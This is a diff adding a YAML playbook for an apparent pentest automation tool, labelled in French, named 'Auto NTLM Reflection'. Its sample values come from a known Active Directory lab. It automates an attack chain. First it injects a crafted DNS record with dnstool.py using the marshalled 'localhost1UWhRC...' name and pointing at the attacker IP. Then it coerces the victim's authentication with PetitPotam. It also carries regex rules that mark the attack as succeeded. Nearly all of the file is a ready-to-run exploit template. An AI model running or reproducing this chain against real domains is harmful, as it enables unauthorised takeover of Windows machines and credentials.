@@ -1,0 +1,44 @@
+id: ntlm_reflection
+name: ⛓️ Auto NTLM Reflection (Native)
+category: Exploitation
+description: "Exploitation CVE-2025 "
+inputs:
+  - name: dc_ip
+    label: "IP du DC"
+    placeholder: 10.3.10.11
+  - name: target_ip
+    label: "IP Cible (Victime)"
+    placeholder: 10.3.10.22
+  - name: attacker_ip
+    label: "IP attacker"
+    placeholder: 10.3.10.1
+  - name: domain
+    label: "Domaine"
+    placeholder: north.sevenkingdoms.local
+  - name: username
+    label: "Utilisateur"
+    placeholder: arya.stark
+  - name: password
+    label: "Mot de passe"
+    placeholder: Needle
+
+steps:
+  - name: "1. Injection DNS (dnstool)"
+    command: "dnstool.py -u '{{domain}}\\{{username}}' -p '{{password}}' {{dc_ip}} -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -a add -d {{attacker_ip}}"
+    extract:
+      dns_status: "successfully"
+
+  - name: "2. Coercion PetitPotam"
+    command: "PetitPotam.py -u '{{username}}' -p '{{password}}' -d '{{domain}}' 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' '{{target_ip}}'"
+
+parsing:
+  mode: "text"
+  save_results: false 
+  rules:
+    - name: "Injection DNS OK"
+      regex: "successfully"
+      badge: "✅ [DNS]"
+
+    - name: "PetitPotam Envoyé"
+      regex: "Attack.*Succeeded"
+      badge: "🚀 [SENT]"
